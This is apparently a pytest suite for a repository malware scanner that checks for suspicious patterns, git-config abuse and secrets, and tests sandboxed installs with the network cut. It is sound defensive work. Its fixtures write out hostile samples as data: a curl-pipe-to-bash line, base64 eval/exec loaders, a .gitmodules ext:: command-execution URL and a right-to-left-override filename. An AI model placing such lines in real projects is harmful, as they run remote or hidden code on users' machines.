import importlib.util
import json as json_module
import subprocess
from pathlib import Path
from unittest.mock import patch

_SCRIPT_PATH = Path(__file__).resolve().parent.parent / "vm_scripts" / "analyze.py"


def _load_analyze_module():
    spec = importlib.util.spec_from_file_location("analyze", _SCRIPT_PATH)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


analyze = _load_analyze_module()


def _init_repo(tmp_path: Path) -> Path:
    repo_dir = tmp_path / "repo"
    repo_dir.mkdir()
    subprocess.run(["git", "init", "-q"], cwd=repo_dir, check=True)
    return repo_dir


def test_scan_malicious_patterns_finds_curl_pipe_bash(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "install.sh").write_text(
        "#!/bin/sh\ncurl https://example.com/payload.sh | bash\n"
    )

    findings = analyze.scan_malicious_patterns(repo_dir)

    assert len(findings) == 1
    assert findings[0]["rule"] == "curl_pipe_shell"
    assert findings[0]["file"] == "install.sh"
    assert findings[0]["line"] == 2
    assert "curl" in findings[0]["snippet"]


def test_scan_malicious_patterns_finds_js_eval_decoded(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "postinstall.js").write_text(
        "eval(Buffer.from('c29tZSBjb2Rl', 'base64').toString());\n"
    )

    findings = analyze.scan_malicious_patterns(repo_dir)

    assert len(findings) == 1
    assert findings[0]["rule"] == "js_eval_decoded"
    assert findings[0]["file"] == "postinstall.js"


def test_scan_malicious_patterns_finds_python_exec_base64(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "setup.py").write_text(
        "import base64\nexec(base64.b64decode(b'cHJpbnQoMSk='))\n"
    )

    findings = analyze.scan_malicious_patterns(repo_dir)

    assert len(findings) == 1
    assert findings[0]["rule"] == "python_exec_base64"


def test_scan_malicious_patterns_ignores_clean_files(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "main.py").write_text("print('hello world')\n")

    findings = analyze.scan_malicious_patterns(repo_dir)

    assert findings == []


def test_scan_malicious_patterns_ignores_binary_files(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "payload.bin").write_bytes(
        b"curl https://example.com/x | bash\x00\x01\x02"
    )

    findings = analyze.scan_malicious_patterns(repo_dir)

    assert findings == []


def test_scan_malicious_patterns_ignores_dot_git_directory(tmp_path):
    repo_dir = _init_repo(tmp_path)
    fake_hook_dir = repo_dir / ".git" / "hooks"
    fake_hook_dir.mkdir(parents=True, exist_ok=True)
    (fake_hook_dir / "fake-hook").write_text("curl https://example.com/x | bash\n")

    findings = analyze.scan_malicious_patterns(repo_dir)

    assert findings == []


def test_scan_git_specifics_finds_gitmodules_ext_transport(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / ".gitmodules").write_text(
        '[submodule "evil"]\n'
        "\tpath = evil\n"
        "\turl = ext::sh -c 'touch /tmp/pwned'\n"
    )

    findings = analyze.scan_git_specifics(repo_dir)

    rules = [f["rule"] for f in findings]
    assert "gitmodules_ext_transport" in rules


def test_scan_git_specifics_finds_gitattributes_custom_filter(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / ".gitattributes").write_text("*.secret filter=my-custom-filter\n")

    findings = analyze.scan_git_specifics(repo_dir)

    rules = [f["rule"] for f in findings]
    assert "gitattributes_custom_filter" in rules


def test_scan_git_specifics_finds_nested_git_path(tmp_path):
    repo_dir = _init_repo(tmp_path)
    nested = repo_dir / "vendor" / ".git"
    nested.mkdir(parents=True)

    findings = analyze.scan_git_specifics(repo_dir)

    rules = [f["rule"] for f in findings]
    assert "nested_git_path" in rules
    nested_finding = next(f for f in findings if f["rule"] == "nested_git_path")
    assert nested_finding["file"] == "vendor/.git"


def test_scan_git_specifics_finds_suspicious_filename_characters(tmp_path):
    repo_dir = _init_repo(tmp_path)
    suspicious_name = "invoice‮gpj.exe"
    (repo_dir / suspicious_name).write_text("not actually an image")

    findings = analyze.scan_git_specifics(repo_dir)

    rules = [f["rule"] for f in findings]
    assert "suspicious_filename_characters" in rules


def test_scan_git_specifics_clean_repo_has_no_findings(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "README.md").write_text("# hello\n")

    findings = analyze.scan_git_specifics(repo_dir)

    assert findings == []


def test_scan_secrets_finds_aws_key(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "config.py").write_text(
        "AWS_KEY = 'AKIAIOSFODNN7EXAMPLE'\n"
    )

    findings = analyze.scan_secrets(repo_dir)

    assert len(findings) == 1
    assert findings[0]["rule"].startswith("secret_")
    assert findings[0]["file"] == "config.py"
    assert findings[0]["line"] == 1
    assert findings[0]["snippet"] == ""


def test_scan_secrets_clean_repo_has_no_findings(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "README.md").write_text("# hello\n")

    findings = analyze.scan_secrets(repo_dir)

    assert findings == []


def test_scan_secrets_ignores_dot_git_directory(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "README.md").write_text("# hello\n")
    (repo_dir / ".git" / "COMMIT_EDITMSG").write_text(
        "Add config\n\nAWS_KEY = 'AKIAIOSFODNN7EXAMPLE'\n"
    )

    findings = analyze.scan_secrets(repo_dir)

    assert findings == []


def test_scan_secrets_marks_not_executed_when_tool_missing(tmp_path):
    repo_dir = _init_repo(tmp_path)

    with patch.object(
        analyze.subprocess, "run", side_effect=FileNotFoundError("no such file")
    ):
        findings = analyze.scan_secrets(repo_dir)

    assert len(findings) == 1
    assert findings[0]["rule"] == "scanner_not_executed"


def test_resolve_detect_secrets_command_finds_venv_sibling_binary():
    with patch.object(analyze.shutil, "which", return_value=None):
        resolved = analyze._resolve_detect_secrets_command()

    expected = str(Path(analyze.sys.executable).parent / "detect-secrets")
    assert resolved == expected
    assert Path(resolved).is_file()


def test_scan_secrets_finds_aws_key_when_not_on_path(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "config.py").write_text(
        "AWS_KEY = 'AKIAIOSFODNN7EXAMPLE'\n"
    )

    with patch.object(analyze.shutil, "which", return_value=None):
        findings = analyze.scan_secrets(repo_dir)

    assert len(findings) == 1
    assert findings[0]["rule"].startswith("secret_")
    assert findings[0]["file"] == "config.py"
    assert findings[0]["line"] == 1


def test_run_writes_combined_json_report(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "install.sh").write_text("curl https://example.com/x | bash\n")
    output_path = tmp_path / "report.json"

    analyze.run(repo_dir, output_path)

    payload = json_module.loads(output_path.read_text())
    assert set(payload.keys()) == {
        "malicious_patterns",
        "git_findings",
        "secrets",
        "dynamic",
    }
    assert len(payload["malicious_patterns"]) == 1
    assert payload["malicious_patterns"][0]["rule"] == "curl_pipe_shell"
    assert payload["git_findings"] == []


def test_cut_network_applies_iptables_rules_successfully():
    with patch.object(analyze.subprocess, "run") as mock_run:
        mock_run.return_value.returncode = 0
        mock_run.return_value.stderr = ""

        result = analyze.cut_network()

    assert result == {"applied": True, "error": ""}
    call_args = mock_run.call_args
    command = call_args.args[0]
    assert command[0] == "sudo"
    assert "iptables" in " ".join(command)


def test_cut_network_keeps_only_ssh_replies_alive():
    """Two live regressions meet here:

    1. A blanket `iptables -P OUTPUT DROP` also blocks the response traffic
       of the established SSH connection the host uses to manage the VM,
       making the host perceive a hang until its outer timeout fires.
    2. A broad `--state ESTABLISHED,RELATED -j ACCEPT` fixes (1) but lets
       DNS leak through pre-cutoff conntrack UDP flows (observed live:
       registry.npmjs.org resolved AFTER the cutoff) — a real
       DNS-exfiltration hole.

    The rule must therefore be scoped to exactly the management channel:
    established TCP traffic FROM source port 22 (sshd's replies), nothing
    else."""
    with patch.object(analyze.subprocess, "run") as mock_run:
        mock_run.return_value.returncode = 0
        mock_run.return_value.stderr = ""

        analyze.cut_network()

    call_args = mock_run.call_args
    command = call_args.args[0]
    joined = " ".join(command)
    assert "-p tcp --sport 22" in joined
    assert "ESTABLISHED" in joined
    assert "ESTABLISHED,RELATED" not in joined
    assert "-j ACCEPT" in joined


def test_cut_network_reports_failure_when_iptables_fails():
    with patch.object(analyze.subprocess, "run") as mock_run:
        mock_run.return_value.returncode = 1
        mock_run.return_value.stderr = "iptables: command not found"

        result = analyze.cut_network()

    assert result["applied"] is False
    assert "command not found" in result["error"]


def test_detect_ecosystem_finds_npm_for_package_json(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "package.json").write_text('{"name": "example"}')

    assert analyze.detect_ecosystem(repo_dir) == "npm"


def test_detect_ecosystem_finds_pip_for_requirements_txt(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "requirements.txt").write_text("requests==2.31.0\n")

    assert analyze.detect_ecosystem(repo_dir) == "pip-requirements"


def test_detect_ecosystem_finds_pip_for_setup_py(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "setup.py").write_text("from setuptools import setup\nsetup()\n")

    assert analyze.detect_ecosystem(repo_dir) == "pip-setup"


def test_detect_ecosystem_returns_none_for_unrecognized_repo(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "README.md").write_text("# hello\n")

    assert analyze.detect_ecosystem(repo_dir) is None


def test_npm_fetch_phase_ignores_scripts_and_exec_phase_runs_them():
    """The two-phase design: dependencies are fetched with the network up but
    with lifecycle scripts DISABLED (so a benign npm install isn't flagged),
    and the scripts are exercised separately in the watched, network-cut
    phase (npm rebuild for dependencies + the root package's own lifecycle
    scripts)."""
    wheel_dir = Path("/tmp/wheels")
    fetch = analyze._fetch_command("npm", wheel_dir)
    assert fetch == ["npm", "install", "--ignore-scripts"]

    exec_cmd = analyze._exec_script_command("npm", wheel_dir)
    assert exec_cmd[:2] == ["bash", "-c"]
    assert "npm rebuild" in exec_cmd[2]
    assert "npm run postinstall --if-present" in exec_cmd[2]


def test_pip_fetch_phase_only_downloads_and_exec_phase_installs_offline():
    """pip's setup.py runs at install time, so the analog split is: download
    (network up) then install offline from the downloaded files (network cut,
    watched) — the offline install is where any setup.py phones home."""
    wheel_dir = Path("/tmp/wheels")
    assert analyze._fetch_command("pip-requirements", wheel_dir) == [
        "pip3", "download", "-r", "requirements.txt", "-d", str(wheel_dir)
    ]
    assert analyze._exec_script_command("pip-requirements", wheel_dir) == [
        "pip3", "install", "--no-index", "--find-links", str(wheel_dir),
        "-r", "requirements.txt",
    ]


import subprocess as subprocess_module
from unittest.mock import MagicMock


def test_run_dynamic_step_skips_when_no_build_command_detected(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "README.md").write_text("# hello\n")

    result = analyze.run_dynamic_step(repo_dir)

    assert result == {
        "attempted": False,
        "command": None,
        "exit_code": None,
        "timed_out": False,
        "network_connect_attempts": [],
    }


def test_run_dynamic_step_runs_detected_command_and_parses_telemetry(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "requirements.txt").write_text("requests==2.31.0\n")
    telemetry_path = repo_dir.parent / "telemetry.log"
    telemetry_path.write_text(
        "connect(3, {sa_family=AF_INET, sin_port=htons(443), "
        'sin_addr=inet_addr("93.184.216.34")}, 16) = -1 ECONNREFUSED\n'
        "openat(AT_FDCWD, \"/etc/passwd\", O_RDONLY) = 3\n"
    )

    with (
        patch.object(analyze.subprocess, "run") as mock_run,
        patch.object(analyze.subprocess, "Popen") as mock_popen,
    ):
        mock_run.return_value.returncode = 0
        mock_run.return_value.stderr = ""
        proc = MagicMock()
        proc.communicate.return_value = ("", "")
        proc.returncode = 0
        mock_popen.return_value = proc

        result = analyze.run_dynamic_step(repo_dir, timeout=60.0)

    assert result["attempted"] is True
    # `command` reports the watched phase-2 command (offline install), which
    # is the one whose connection attempts are attributed to the repo.
    assert result["command"] == [
        "pip3", "install", "--no-index", "--find-links",
        str(repo_dir.parent / "wheels"), "-r", "requirements.txt",
    ]
    # Phase 1 fetched with the network up and lifecycle code disabled.
    fetch_call = mock_run.call_args_list[0]
    assert fetch_call.args[0] == [
        "pip3", "download", "-r", "requirements.txt", "-d",
        str(repo_dir.parent / "wheels"),
    ]
    assert result["exit_code"] == 0
    assert result["timed_out"] is False
    assert result["network_cutoff_applied"] is True
    assert len(result["network_connect_attempts"]) == 1
    assert "connect(" in result["network_connect_attempts"][0]
    popen_kwargs = mock_popen.call_args.kwargs
    assert popen_kwargs["start_new_session"] is True


def test_telemetry_only_counts_external_inet_connects(tmp_path):
    """The network cutoff policy explicitly ACCEPTs loopback traffic, so
    connects to 127.x (e.g. the systemd-resolved DNS stub at 127.0.0.53,
    which npm hits dozens of times) and local AF_UNIX sockets must NOT be
    counted as 'attempts after the cutoff' — only genuine external
    AF_INET/AF_INET6 destinations are violations. (Observed live: a benign
    npm project was flagged MALICIOUS on 54 loopback/unix connects.)"""
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "package.json").write_text('{"name": "example"}')
    telemetry_path = repo_dir.parent / "telemetry.log"
    telemetry_path.write_text(
        # external IPv4: must count
        'connect(3, {sa_family=AF_INET, sin_port=htons(443), '
        'sin_addr=inet_addr("93.184.216.34")}, 16) = -1 EPERM\n'
        # loopback DNS stub: must NOT count
        'connect(4, {sa_family=AF_INET, sin_port=htons(53), '
        'sin_addr=inet_addr("127.0.0.53")}, 16) = 0\n'
        # unix socket: must NOT count
        'connect(5, {sa_family=AF_UNIX, sun_path="/run/systemd/resolve/io.systemd.Resolve"}, 42) = 0\n'
        # IPv6 loopback: must NOT count
        'connect(6, {sa_family=AF_INET6, sin6_port=htons(443), '
        'sin6_addr=inet_pton(AF_INET6, "::1", &sin6_addr)}, 28) = -1 EPERM\n'
        # external IPv6: must count
        'connect(7, {sa_family=AF_INET6, sin6_port=htons(443), '
        'sin6_addr=inet_pton(AF_INET6, "2606:4700::6810:84e5", &sin6_addr)}, 28) = -1 EPERM\n'
        # port-0 UDP address-selection probe (transmits nothing — node/glibc
        # use these to rank candidate addresses): must NOT count
        'connect(25, {sa_family=AF_INET, sin_port=htons(0), '
        'sin_addr=inet_addr("104.16.1.34")}, 16) = 0\n'
    )

    with (
        patch.object(analyze.subprocess, "run") as mock_run,
        patch.object(analyze.subprocess, "Popen") as mock_popen,
    ):
        mock_run.return_value.returncode = 0
        mock_run.return_value.stderr = ""
        proc = MagicMock()
        proc.communicate.return_value = ("", "")
        proc.returncode = 0
        mock_popen.return_value = proc

        result = analyze.run_dynamic_step(repo_dir, timeout=60.0)

    assert len(result["network_connect_attempts"]) == 2
    assert '93.184.216.34' in result["network_connect_attempts"][0]
    assert "2606:4700" in result["network_connect_attempts"][1]


def test_run_dynamic_step_marks_timed_out_on_timeout_and_kills_process_group(tmp_path):
    """On timeout the WHOLE process group must be killed, not just strace:
    strace's tracees (npm/node) survive strace's own death and — with the
    network cut — keep retrying connections for many minutes, keeping the
    systemd analysis unit 'active' long after this script returns (this was
    the live 600s-timeout bug's final root cause)."""
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "package.json").write_text('{"name": "example"}')

    with (
        patch.object(analyze.subprocess, "run") as mock_run,
        patch.object(analyze.subprocess, "Popen") as mock_popen,
        patch.object(analyze.os, "killpg") as mock_killpg,
    ):
        mock_run.return_value.returncode = 0
        mock_run.return_value.stderr = ""
        proc = MagicMock()
        proc.pid = 4242
        proc.communicate.side_effect = subprocess_module.TimeoutExpired(
            cmd=["strace"], timeout=60.0
        )
        mock_popen.return_value = proc

        result = analyze.run_dynamic_step(repo_dir, timeout=60.0)

    assert result["attempted"] is True
    assert result["timed_out"] is True
    assert result["exit_code"] is None
    mock_killpg.assert_called_once()
    assert mock_killpg.call_args.args[0] == 4242
    proc.wait.assert_called_once()


def test_fetch_phase_timeout_does_not_abort_the_dynamic_step(tmp_path):
    """A large project's dependency download (phase 1, network up) can be
    slow; if it exceeds its own generous timeout we must still run the
    watched phase on whatever landed and return a result — never crash the
    analysis."""
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "package.json").write_text('{"name": "example"}')

    with (
        patch.object(analyze.subprocess, "run") as mock_run,
        patch.object(analyze.subprocess, "Popen") as mock_popen,
    ):
        def run_side_effect(command, **kwargs):
            if command[:2] == ["npm", "install"]:
                raise subprocess_module.TimeoutExpired(cmd=command, timeout=300.0)
            result = MagicMock()
            result.returncode = 0
            result.stderr = ""
            return result

        mock_run.side_effect = run_side_effect
        proc = MagicMock()
        proc.communicate.return_value = ("", "")
        proc.returncode = 0
        mock_popen.return_value = proc

        result = analyze.run_dynamic_step(repo_dir, timeout=60.0)

    assert result["attempted"] is True
    assert result["fetch_timed_out"] is True
    # The watched phase still ran (Popen was invoked with the exec command).
    assert mock_popen.called


def test_run_includes_dynamic_step_in_combined_report(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "README.md").write_text("# hello, no build system here\n")
    output_path = tmp_path / "report.json"

    analyze.run(repo_dir, output_path)

    payload = json_module.loads(output_path.read_text())
    assert set(payload.keys()) == {
        "malicious_patterns",
        "git_findings",
        "secrets",
        "dynamic",
    }
    assert payload["dynamic"]["attempted"] is False
